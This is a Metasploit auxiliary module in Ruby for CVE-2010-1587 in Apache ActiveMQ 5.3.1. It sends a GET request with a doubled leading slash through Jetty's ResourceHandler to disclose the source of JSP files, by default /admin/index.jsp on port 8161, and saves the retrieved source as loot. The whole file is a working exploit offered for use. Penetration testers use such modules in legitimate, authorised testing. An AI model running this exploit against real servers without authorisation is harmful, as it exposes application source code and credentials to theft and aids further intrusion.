##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache ActiveMQ JSP Files Source Disclosure',
        'Description' => %q{
          This module exploits a source code disclosure in Apache ActiveMQ. The
          vulnerability is due to the Jetty's ResourceHandler handling of specially crafted
          URI's starting with //. It has been tested successfully on Apache ActiveMQ 5.3.1
          over Windows 2003 SP2 and Ubuntu 10.04.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Veerendra G.G', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
        'References' => [
          [ 'CVE', '2010-1587' ],
          [ 'OSVDB', '64020' ],
          [ 'BID', '39636' ],
          [ 'URL', 'https://issues.apache.org/jira/browse/AMQ-2700' ]
        ],
        'DefaultOptions' => { 'RPORT' => 8161 },
        'Notes' => {
          'Reliability' => [],
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Path to the JSP file to disclose source code', '/admin/index.jsp'])
      ]
    )
  end

  def run_host(ip)
    print_status('Sending request...')
    # Add the exploit's second slash after normalization, which removes repeated
    # slashes. This routes the request through Jetty's vulnerable ResourceHandler.
    uri = "/#{normalize_uri(target_uri.path)}"
    res = send_request_cgi({
      'uri' => uri,
      'method' => 'GET'
    })

    # A rendered JSP is also HTTP200; it must not be reported as disclosed source.
    if res && res.code == 200 && res.body.to_s.include?('<%')
      contents = res.body
      fname = File.basename(datastore['TARGETURI'])
      path = store_loot(
        'apache.activemq',
        'text/plain',
        ip,
        contents,
        fname
      )
      print_status("File saved in: #{path}")
    else
      print_error('Failed to retrieve JSP source')
      return
    end
  end
end
